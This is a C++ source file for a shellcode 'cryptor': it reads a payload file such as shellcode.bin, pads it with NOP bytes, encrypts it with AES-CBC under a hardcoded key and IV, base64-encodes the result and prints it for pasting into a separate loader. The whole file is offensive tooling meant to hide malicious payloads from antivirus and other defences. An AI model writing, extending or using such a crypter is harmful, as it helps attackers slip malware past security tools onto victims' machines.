#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <iterator>
#include "aes.hpp"
#include "base64.h"


std::vector<uint8_t> readFile(const char* filename)
{
    // open the file:
    std::ifstream file(filename, std::ios::binary);

    // Stop eating new lines in binary mode!!!
    file.unsetf(std::ios::skipws);

    // get its size:
    std::streampos fileSize;

    file.seekg(0, std::ios::end);
    fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    // reserve capacity
    std::vector<BYTE> vec;
    vec.reserve(fileSize);

    // read the data:
    vec.insert(vec.begin(), std::istream_iterator<BYTE>(file), std::istream_iterator<BYTE>());

    return vec;
}

int main(int argc, char* argv[])
{
    if (argc < 2)
    {
        printf("Usage:\tcryptor.exe <payload.bin>\n");
        printf("Example\tcryptor.exe C:\\Users\\admin\\shellcode.bin\n");
        exit(1);
    }

    std::vector<uint8_t> plaintext, ciphertext;

    // AES Objects
    struct AES_ctx e_ctx;
    uint8_t iv[] = { 0xb4,0x30,0xec,0x73,0x14,0x99,0x81,0xba,0xa0,0x63,0xf2,0x89,0xd9,0xed,0x03,0x5e };
    uint8_t key[] = { 0xf2,0x10,0xea,0x3d,0x97,0x36,0xdb,0x94,0xdc,0x52,0x1c,0xe7,0xba,0xb8,0x34,0x2a,0x36,0x9f,0x5f,0xe9,0x28,0x05,0x3f,0xd1,0x1e,0xbd,0x7f,0xde,0x2e,0xe0,0xd7,0xfd };
    AES_init_ctx_iv(&e_ctx, key, iv);

    plaintext.clear();
    plaintext = readFile(argv[1]);
    
    // Padd the plaintext if needed with NOPS
    while ((plaintext.size() % 16) != 0)
    {
        plaintext.push_back(0x90);
    }

    // ENCRYPT
    ciphertext.clear();
    AES_CBC_encrypt_buffer(&e_ctx, plaintext.data(), plaintext.size());             // Encrypt the plaintext data
    std::copy(plaintext.begin(), plaintext.end(), std::back_inserter(ciphertext));  // Load the ciphertext into the ciphertext vector.

    // ENCODE
    base64 b64 = base64();
    std::string encoded = b64.base64_encode(plaintext.data(), plaintext.size());
    std::cout << "[i] Replace shellcode string in loader with one below:\n" << std::endl;
    printf("shellcode = \"%s\";", encoded.c_str());

}

